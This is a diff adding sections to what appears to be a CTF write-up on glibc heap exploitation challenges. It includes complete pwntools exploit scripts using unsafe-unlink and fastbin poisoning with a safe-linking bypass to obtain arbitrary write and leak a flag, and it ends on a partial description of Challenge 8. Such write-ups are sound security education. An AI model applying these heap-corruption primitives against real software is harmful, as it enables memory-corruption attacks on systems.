@@ -429,10 +429,225 @@ def exploit():
 
 Now the flag is loaded to some heap address prior to program's execution. We can execute malloc requests of at least `0x420`. But now there's no `safe_read`, but `read` handler, which means we can overflow writes, towards the metadata of their preceding chunks. \
 My initial idea is abit complex, but should work: we can create 2 tcache holes (`alloc(0, 3100), alloc(1, 3000), free(0), alloc(0, 3000) x 2`). By using the overwrite vulnerability, we can overwrite the `next` ptr of one of them, hence controlling the returned address upon new allocation. However, this allocation must be within the tcache, hence it won't be easily adequate for this case (as we can only call malloc larger than `0x420`). This makes the approach of exploitation solely by the tcache very tough. \
-A similar yet better approach is to exploit the fastbins instead. While we can still populate the fastbins as described for the tcache, upon allocation of more than `0x420` bytes, they are actually being consolidated into the unsorted bin!
+A similar yet better approach is to exploit the fastbins instead. While we can still populate the fastbins as described for the tcache, upon allocation of more than `0x420` bytes, they are actually being consolidated into the unsorted bin! However, since we're limited to large allocations, this probably isn't the intended route for this exercise. \
+Largebin-attach isn't adequate, as it only allows us to write a large chunk pointer to arbitrary address. Instead, unsafe-unlink might be adequate. This exploitation idea is fairly old, and gone through many mitigations. However, in case we know an address in memory that contains our goal victim chunk pointer (such as a global memory address), we can still use this exploit. Its primitive is very strong - by having small OOB-W towards a freed chunk, we can obtain full arbitrary-write primitive. 
 
+The idea is very cool - 
 
+```python
+# Avoid tcache, fastbins
+size = 0x420  
+# There must be some memory address that contains the value of p0. For example, global within the .bss
+global p0;
+p0 = malloc(size)
+p1 = malloc(size)
+# Create fake freed chunk inside chunk0
+# Prev size = 0, we dont care
+*(p0 + 0) = 0
+# Chunk size 0x420, meaning allocation size lower by 0x10 bytes
+*(p0 + 8) = 0x421 
+# Pass P->fd->bk = P. Here comes the global ptr assumption - because it resides within &p0, this check passes.
+*(p0 + 0x10) = &p0 - 0x18
+# Pass P->bk->fd = P
+*(p0 + 0x18) = &p0 - 0x10
+# In order to pass size = prevsize(nextchunk(p)),Overwrite the preceding chunk p1 metadata
+*(p1 - 0x10) = 0x420
+# Clear the IN_USE bit, so that the fake chunk would be able to consolidate
+*(p1 - 0x8) &= ~1
+# Trigger consolidation. Recall it eventually does:
+# fd->bk = bk
+# bk->fd = fd
+# Since both fd->bk and bk->fd points to &p0, we'd write the value of fd, which is &p0 - 0x18, to the global &p0. 
+# This means that by the end of this call, we've overwritten p0 value, as stored within &p0, to &p0 - 0x18
+free(p1)
+# Now we can use the self-overwrite primitive to set &p0 to contain arbitrary address!
+*(p0 + 0x18) = target
+# Write arbitrary content to arbitrary address!
+*(p0) = 0x4141414142424242
+```
 
+Since there's a global `alloc_struct` array, we can overwrite our victim's address, obtaining arbitrary write, and placing our wanted address to-be-leaked as a new slot within the `alloc_struct` array. That way, we would be able to read its contents (and also to arbitrary write into it).
+
+```python
+def exploit():
+    p = process(BINARY)
+    flag_addr = get_leak(p)
+    log.info(f'flag_addr: {hex(flag_addr)}')
+    
+    size = 0x420
+    alloc_struct = p.elf.symbols['alloc_struct'] + 32 * 8
+    log.info(f'alloc_struct: {hex(alloc_struct)}')
+    
+    # Allocate two chunks - p0 is the victim
+    p0_index = 8
+    p1_index = 1
+    p0 = malloc(p, p0_index, size)
+    p1 = malloc(p, p1_index, size)
+    p0_addr = alloc_struct + 8 * p0_index
+    log.info(f'p0_addr: {hex(p0_addr)}')
+
+    # Create fake chunk inside p0
+    buf = p64(0)  # prev_size
+    buf += p64(size + 1)  # Chunk size corresponds to size(p0) - 0x10! Moreover, prev inuse is SET, to prevent consolidation. 
+    buf += p64(p0_addr - 0x18)  # In order to satisfy p->fd->bk = p, use the global pointer that contains the value of p
+    buf += p64(p0_addr - 0x10)  # p->bk->fd = p
+    buf += b'\x00' * (size - len(buf))  # Pad rest of user_data. Notice: it is important to pad this with NULLs, not 'A's. Otherwise, it might try to access fd_nextsize, bk_nextsize, being a candidate for largebins!
+    # Vuln - overwrite past the bounds of p0, the metadata of chunk p1
+    buf += p64(size)  # Make sure prev_size corresponds to 0x420, so the check size(p) == prev_size(next(p)) pass
+    buf += p64(size + 0x10)  # Important - only clears the PREV_INUSE bit of p1.size, to enable consolidation with the fake chunk. Doesn't changes real size at all!
+    read(p, p0_index, len(buf), buf)
+
+    # Trigger consolidation. This would overwrite the content as follows:
+    # fd->bk = bk
+    # bk->fd = fd
+    # Since both fd->bk, bk->fd are p0_addr, by the end of this we'd write fd, which is 'p0_addr - 0x18', to p0_addr
+    free(p, p1_index)
+
+    # Now by writing to p0_index, which slot corresponds to p0_addr - 0x18, we can add new slots, or overwrite the existing slot. 
+    # Since I'd like to preserve the possibility of using the write primitive multiple times, I won't overwrite the p0_index slot. 
+    buf_2 = p64(flag_addr)
+    read(p, p0_index, len(buf_2), buf_2)
+
+    # Leak the flag
+    arbitrary_addr_index = p0_index - 3
+    flag = puts_addr(p, arbitrary_addr_index)
+    log.info(f'flag: {flag}')
+
+    p.interactive()
+```
+
+## Challenge 6
+
+Now we can only perform very small allocations `<0x18 bytes` via `calloc`. Also the `size` is being tracked, hence `safer_read` doesn't contains any vuln while writing content into an allocated chunk. \
+However, our primitive is to overwrite arbitrary amount of bytes into global buffer, that resides AFTER the `alloc_struct` in memory. We do have the flag pointer stored at a global within the `.bss`. Our primitive is UAF, and we can mostly use the fastbins. \
+It is important to note, that `calloc` actually ignores the tcache while performing allocations. But recall that fastbins behave in a very similar manner to tcache. Hence, we can use fastbins poisioning in order to corrupt their `next` ptr, just taking into account safe-linking. \
+Upon developing the exploit, I've seen the last allocation, the one that should reside on the flag, actually failes at the following check:
+
+```c
+idx = fastbin_index (nb);
+...
+size_t victim_idx = fastbin_index (chunksize (victim));
+if (__builtin_expect (victim_idx != idx, 0))
+	malloc_printerr ("malloc(): memory corruption (fast)");
+```
+
+This means that we cannot allocate at completely arbitrary address, and we have to make sure its chunk size actually corresponds to the size of the allocation. \
+But recall that the flag actually resides at offset `0x4508` within the .bss, and we have a primitive to write content within the `.bss`, starting from offset `0x4200`. Hence, we can maliciously craft fake size, and the allocation should succeed in that case. The second note we should reason about, is to make sure the fastbin allocation is being performed to some aligned address. \
+Another last trick is to fill the chunk's contents with 'A's, such that `puts` call won't stop upon reading its content. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    flag_addr = get_leak(p)
+    log.info(f'flag_addr: {hex(flag_addr)}')
+    
+    global_to_flag_offset = 0x308
+    size = 0x18
+    chunk_size = 0x21
+
+    # Fill tcache
+    tcache_bin_size = 7
+    for i in range(tcache_bin_size):
+        calloc(p, i, size)
+    for i in range(tcache_bin_size):
+        free(p, i)
+
+    # Fill .bss with adequate chunk size value
+    buf_0 = p64(chunk_size) * int(global_to_flag_offset / 8)
+    read_to_global(p, len(buf_0), buf_0)
+
+    # Create 2-chunks fastbins linked list
+    calloc(p, 0, size)
+    calloc(p, 1, size)
+    free(p, 1)
+    free(p, 0)
+
+    # Leak safe-linking next ptr
+    mangled_next_ptr = puts_addr(p, 0)
+    mangled_next_ptr = u64(mangled_next_ptr.ljust(8, b'\x00'))
+    log.info(f'mangled_next_ptr: {hex(mangled_next_ptr)}')
+    next_ptr, heap_key = demangle_ptr(mangled_next_ptr)
+    log.info(f'next_ptr: {hex(next_ptr)} heap_key: {(hex(heap_key))}')
+
+    # Overwrite freed chunk's next ptr to our goal address
+    aligned_flag_addr = flag_addr - (0x10 + size)  # room for prev_size, size, and the chunk itself
+    buf = p64(aligned_flag_addr ^ heap_key)
+    buf = buf.ljust(size, b'\x00')
+    safer_read(p, 0, buf)
+
+    # Allocate a chunk right before the flag
+    calloc(p, 2, size)
+    calloc(p, 3, size)
+    buf_2 = b'A' * size
+    safer_read(p, 3, buf_2)
+
+    flag = puts_addr(p, 3)
+    log.info(f'flag: {flag}')
+
+    p.interactive()
+```
+
+## Challenge 7
+
+In a similar manner to before, now we can perform allocations of up to `0x30` bytes. The flag is stored within the `.bss`, and there's a safer-read function that checks for boundaries. \
+As before, we still have a UAF vuln. My idea is to use the same trick as before - obtain an arbitrary-alloc primitive, but this time, to allocate my goal buffer at the `alloc_struct`, hence writing a new slot within. However, we do not have an adequate size there. But this means we can allocate at the sizes region of `alloc_struct` a new chunk of our wish. This would allow us to overwrite existing `size`s of already-made allocations. In particular, it would allow overwrite the `size` of the allocation we've just made, and by doing so - write bytes until the flag is encountered, then print it via `puts`. \
+A major simplification may be done - notice that the flag is actually saved right next to the `alloc_struct` size region. This means all we have to do is to perform the allocation at the end of the size region, and we're done. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    flag_addr = get_leak(p)
+    log.info(f'flag_addr: {hex(flag_addr)}')
+    
+    size = 0x18
+    chunk_size = 0x21
+
+    # Fill tcache
+    tcache_bin_size = 7
+    for i in range(tcache_bin_size):
+        calloc(p, i, size)
+    for i in range(tcache_bin_size):
+        free(p, i)
+
+    # Fill .bss with adequate chunk size value
+    for i in range(0, 18, 2):
+        calloc(p, i, chunk_size)
+
+    # Create 2-chunks fastbins linked list
+    calloc(p, 0, size)
+    calloc(p, 1, size)
+    free(p, 1)
+    free(p, 0)
+
+    # Leak safe-linking next ptr
+    mangled_next_ptr = puts_addr(p, 0)
+    mangled_next_ptr = u64(mangled_next_ptr.ljust(8, b'\x00'))
+    log.info(f'mangled_next_ptr: {hex(mangled_next_ptr)}')
+    next_ptr, heap_key = demangle_ptr(mangled_next_ptr)
+    log.info(f'next_ptr: {hex(next_ptr)} heap_key: {(hex(heap_key))}')
+
+    # Overwrite freed chunk's next ptr to our goal address
+    aligned_flag_addr = flag_addr - (0x10 + size)  # room for prev_size, size, and the chunk itself
+    buf = p64(aligned_flag_addr ^ heap_key)
+    buf = buf.ljust(size, b'\x00')
+    safer_read(p, 0, buf)
+
+    # Allocate a chunk right before the flag
+    calloc(p, 2, size)
+    calloc(p, 3, size)
+    buf_2 = b'A' * size
+    safer_read(p, 3, buf_2)
+
+    flag = puts_addr(p, 3)
+    log.info(f'flag: {flag}')
+
+    p.interactive()
+```
+
+## Challenge 8
+
+This time we can perform allocations of up to `0x1000` bytes, using `malloc`. Moreover, unlike before, now the `free` handler nullifies a pointer's slot and its corresponding size slot, hence closes the UAF vuln. If that's not enough, `puts` performs a check according to `malloc_usable_size`, asserting it contains some legitimate value, before printing the chunk's content. \
+`read_flag` dynamically allocates a large chunk ox size `0x56e`, and reads the flag there. If we can manage to tweak this allocation / perform double free, such that the returned address would be an-already-used address, we can pwn this. The new vuln resides within `read_copy`, which copies chunk's content to global `strcpy_scratch` within the `.bss` (based on the chunk's requested size), and reads that content into the chunk. Then, it sets a single null byte right past the end of the chunk. This means the vuln we have is a single null byte overflow. 
 
 
 
